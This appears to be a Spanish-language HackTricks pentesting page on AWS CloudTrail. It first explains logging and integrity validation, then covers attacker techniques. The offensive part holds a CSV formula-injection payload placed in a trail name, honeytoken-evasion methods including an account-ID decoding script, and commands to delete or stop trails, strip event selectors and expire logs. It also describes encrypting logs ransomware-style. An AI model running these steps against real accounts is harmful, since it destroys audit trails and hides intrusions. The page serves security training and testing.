# AWS - CloudTrail Enum

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **CloudTrail**

AWS CloudTrail **registra y monitorea la actividad dentro de tu entorno AWS**. Captura **registros de eventos detallados**, incluyendo qui√©n hizo qu√©, cu√°ndo y desde d√≥nde, para todas las interacciones con recursos de AWS. Esto proporciona un registro de auditor√≠a de cambios y acciones, ayudando en el an√°lisis de seguridad, auditor√≠a de cumplimiento y seguimiento de cambios de recursos. CloudTrail es esencial para entender el comportamiento de usuarios y recursos, mejorar la postura de seguridad y asegurar el cumplimiento regulatorio.

Cada evento registrado contiene:

* El nombre de la API llamada: `eventName`
* El servicio llamado: `eventSource`
* La hora: `eventTime`
* La direcci√≥n IP: `SourceIPAddress`
* El m√©todo del agente: `userAgent`. Ejemplos:
  * Signing.amazonaws.com - Desde AWS Management Console
  * console.amazonaws.com - Usuario root de la cuenta
  * lambda.amazonaws.com - AWS Lambda
* Los par√°metros de la solicitud: `requestParameters`
* Los elementos de respuesta: `responseElements`

Los eventos se escriben en un nuevo archivo de registro **aproximadamente cada 5 minutos en un archivo JSON**, son retenidos por CloudTrail y finalmente, los archivos de registro son **entregados a S3 aproximadamente 15 minutos despu√©s**.\
Los registros de CloudTrail pueden ser **agregados a trav√©s de cuentas y regiones**.\
CloudTrail permite usar **integridad de archivo de registro para poder verificar que tus archivos de registro han permanecido sin cambios** desde que CloudTrail los entreg√≥. Crea un hash SHA-256 de los registros dentro de un archivo de resumen. Un hash sha-256 de los nuevos registros se crea cada hora.\
Al crear un Trail, los selectores de eventos te permitir√°n indicar al trail registrar: eventos de gesti√≥n, datos o insights.

Los registros se guardan en un bucket de S3. Por defecto se utiliza el cifrado del lado del servidor (SSE-S3) por lo que AWS desencriptar√° el contenido para las personas que tengan acceso, pero para seguridad adicional puedes usar SSE con KMS y tus propias claves.

Los registros se almacenan en un **bucket de S3 con este formato de nombre**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Siendo el BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Ejemplo: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Dentro de cada carpeta, cada registro tendr√° un **nombre siguiendo este formato**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Convenci√≥n de Nombres de Archivos de Registro

![](<../../../../.gitbook/assets/image (29).png>)

Adem√°s, **los archivos de resumen (para verificar la integridad del archivo)** estar√°n dentro del **mismo bucket** en:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregar Registros de M√∫ltiples Cuentas

* Crea un Trail en la cuenta de AWS donde quieres que se entreguen los archivos de registro
* Aplica permisos al bucket de S3 de destino permitiendo acceso entre cuentas para CloudTrail y permite a cada cuenta de AWS que necesite acceso
* Crea un nuevo Trail en las otras cuentas de AWS y selecciona usar el bucket creado en el paso 1

Sin embargo, incluso si puedes guardar todos los registros en el mismo bucket de S3, no puedes agregar registros de CloudTrail de m√∫ltiples cuentas en un CloudWatch Logs perteneciente a una sola cuenta de AWS.

{% hint style="danger" %}
Recuerda que una cuenta puede tener **diferentes Trails** de CloudTrail **activados** almacenando los mismos (o diferentes) registros en diferentes buckets.
{% endhint %}

### Cloudtrail de todas las cuentas de la org en 1

Al crear un CloudTrail, es posible indicar activar cloudtrail para todas las cuentas de la org y obtener los registros en solo 1 bucket:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

De esta manera, puedes configurar f√°cilmente CloudTrail en todas las regiones de todas las cuentas y centralizar los registros en 1 cuenta (que deber√≠as proteger).

### Verificaci√≥n de Archivos de Registro

Puedes verificar que los registros no hayan sido alterados ejecutando

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### Registros a CloudWatch

**CloudTrail puede enviar autom√°ticamente registros a CloudWatch para que puedas configurar alertas que te avisen cuando se realicen actividades sospechosas.**\
Ten en cuenta que para permitir que CloudTrail env√≠e los registros a CloudWatch, es necesario crear un **rol** que permita esa acci√≥n. Si es posible, se recomienda usar el rol predeterminado de AWS para realizar estas acciones. Este rol permitir√° a CloudTrail:

* CreateLogStream: Esto permite crear flujos de registros de CloudWatch Logs
* PutLogEvents: Entregar registros de CloudTrail a flujos de registros de CloudWatch Logs

### Historial de Eventos

El Historial de Eventos de CloudTrail te permite inspeccionar en una tabla los registros que se han grabado:

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** analiza autom√°ticamente eventos de gesti√≥n de escritura de los trails de CloudTrail y te **alerta** sobre **actividades inusuales**. Por ejemplo, si hay un aumento en eventos `TerminateInstance` que difiere de las l√≠neas base establecidas, lo ver√°s como un evento Insight. Estos eventos hacen que **encontrar y responder a la actividad inusual de la API sea m√°s f√°cil** que nunca.

Los insights se almacenan en el mismo bucket que los registros de CloudTrail en: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Seguridad

| Integridad del Archivo de Registro de CloudTrail | <ul><li>Validar si los registros han sido alterados (modificados o eliminados)</li><li><p>Usa archivos de resumen (crear hash para cada archivo)</p><ul><li>Hashing SHA-256</li><li>SHA-256 con RSA para firma digital</li><li>clave privada propiedad de Amazon</li></ul></li><li>Tarda 1 hora en crear un archivo de resumen (se hace cada hora)</li></ul> |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Detener el acceso no autorizado                  | <ul><li><p>Usar pol√≠ticas de IAM y pol√≠ticas de bucket de S3</p><ul><li>equipo de seguridad ‚Äî> acceso de administrador</li><li>auditores ‚Äî> acceso de solo lectura</li></ul></li><li>Usar SSE-S3/SSE-KMS para cifrar los registros</li></ul>                                                                                                                                        |
| Prevenir la eliminaci√≥n de archivos de registro  | <ul><li>Restringir el acceso de eliminaci√≥n con pol√≠ticas de IAM y de bucket</li><li>Configurar eliminaci√≥n de S3 MFA</li><li>Validar con Validaci√≥n de Archivo de Registro</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor se basa en los √∫ltimos 400 d√≠as de registros de **CloudTrail para recopilar sus insights**. CloudTrail captura un historial de llamadas a la API de AWS y eventos relacionados realizados en una cuenta de AWS. Access Advisor utiliza estos datos para **mostrar cu√°ndo se accedi√≥ por √∫ltima vez a los servicios**. Al analizar los registros de CloudTrail, Access Advisor puede determinar a qu√© servicios ha accedido un usuario o rol de IAM y cu√°ndo ocurri√≥ ese acceso. Esto ayuda a los administradores de AWS a tomar decisiones informadas sobre **refinar permisos**, ya que pueden identificar servicios a los que no se ha accedido durante per√≠odos prolongados y potencialmente reducir permisos excesivamente amplios basados en patrones de uso reales.

{% hint style="success" %}
Por lo tanto, Access Advisor informa sobre **los permisos innecesarios que se est√°n otorgando a los usuarios** para que el administrador pueda eliminarlos.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Acciones

### Enumeraci√≥n
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Inyecci√≥n CSV**

Es posible realizar una inyecci√≥n de CVS dentro de CloudTrail que ejecutar√° c√≥digo arbitrario si los registros se exportan en CSV y se abren con Excel.\
El siguiente c√≥digo generar√° una entrada de registro con un nombre de Trail incorrecto que contiene el payload:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Para obtener m√°s informaci√≥n sobre las inyecciones CSV, consulta la p√°gina:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Para obtener m√°s informaci√≥n sobre esta t√©cnica espec√≠fica, consulta [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Evadir Detecci√≥n**

### Evasi√≥n de HoneyTokens

Los HoneyTokens se crean para **detectar la exfiltraci√≥n de informaci√≥n sensible**. En el caso de AWS, son **claves de AWS cuyo uso se monitoriza**; si algo desencadena una acci√≥n con esa clave, entonces alguien debe haber robado esa clave.

Sin embargo, esta monitorizaci√≥n se realiza a trav√©s de **CloudTrail**, y hay algunos **servicios de AWS que no env√≠an registros a CloudTrail** (encuentra la [lista aqu√≠](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Algunos de estos servicios **responder√°n** con un **error** que contiene el **ARN del rol de la clave** si alguien no autorizado (la clave honeytoken) intenta acceder a √©l.

De esta manera, un **atacante puede obtener el ARN de la clave sin activar ning√∫n registro**. En el ARN, el atacante puede ver el **ID de la cuenta de AWS y el nombre**; es f√°cil conocer los ID de las cuentas y los nombres de las empresas de HoneyToken, as√≠ que de esta manera un atacante puede identificar si el token es un HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### **Detecci√≥n de HoneyTokens**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) detecta si una clave pertenece a [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Si **`canarytokens.org`** aparece en el nombre del rol o el ID de la cuenta **`534261010715`** aparece en el mensaje de error.
* Prob√°ndolos m√°s recientemente, est√°n utilizando la cuenta **`717712589309`** y todav√≠a tiene la cadena **`canarytokens.com`** en el nombre.
* Si **`SpaceCrab`** aparece en el nombre del rol en el mensaje de error.
* **SpaceSiren** utiliza **uuids** para generar nombres de usuario: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si el **nombre parece generado aleatoriamente**, hay altas probabilidades de que sea un HoneyToken.

{% hint style="danger" %}
Ten en cuenta que todas las APIs p√∫blicas descubiertas por no crear registros de CloudTrail ahora est√°n corregidas, as√≠ que tal vez necesites encontrar las tuyas...

O puedes obtener el **ID de la cuenta** desde el **codificado** dentro de la **clave de acceso** como se [**explica aqu√≠**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) y verificar el ID de la cuenta con tu lista de cuentas AWS de Honeytokens:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Para m√°s informaci√≥n, consulta la [**investigaci√≥n original**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Accediendo a Infraestructura de Terceros

Ciertos servicios de AWS **generar√°n infraestructura** como **Bases de Datos** o cl√∫steres de **Kubernetes** (EKS). Un usuario **comunic√°ndose directamente con esos servicios** (como la API de Kubernetes) **no utilizar√° la API de AWS**, por lo que CloudTrail no podr√° ver esta comunicaci√≥n.

Por lo tanto, un usuario con acceso a EKS que haya descubierto la URL de la API de EKS podr√≠a generar un token localmente y **hablar directamente con el servicio de API sin ser detectado por Cloudtrail**.

M√°s informaci√≥n en:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modificando la Configuraci√≥n de CloudTrail

#### Eliminar trails
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Detener trails
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Desactivar el registro multi-regi√≥n

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Desactivar Registro por Selectores de Eventos

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

En el primer ejemplo, se proporciona un √∫nico selector de eventos como un arreglo JSON con un solo objeto. `"ReadWriteType": "ReadOnly"` indica que **el selector de eventos solo debe capturar eventos de solo lectura** (por lo que CloudTrail insights **no revisar√° eventos de escritura**, por ejemplo).

Puedes personalizar el selector de eventos seg√∫n tus requisitos espec√≠ficos.

#### Eliminaci√≥n de registros mediante pol√≠tica de ciclo de vida de S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modificaci√≥n de la Configuraci√≥n del Bucket

* Eliminar el bucket de S3
* Cambiar la pol√≠tica del bucket para denegar cualquier escritura desde el servicio CloudTrail
* A√±adir pol√≠tica de ciclo de vida al bucket de S3 para eliminar objetos
* Deshabilitar la clave KMS utilizada para cifrar los registros de CloudTrail

### Ransomware de Cloudtrail

#### Ransomware de S3

Podr√≠as **generar una clave asim√©trica** y hacer que **CloudTrail cifre los datos** con esa clave y **eliminar la clave privada** para que el contenido de CloudTrail no pueda ser recuperado.\
Esto es b√°sicamente un **ransomware S3-KMS** explicado en:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware de KMS**

Esta es una manera m√°s f√°cil de realizar el ataque anterior con diferentes requisitos de permisos:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencias**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Aprende hacking de AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
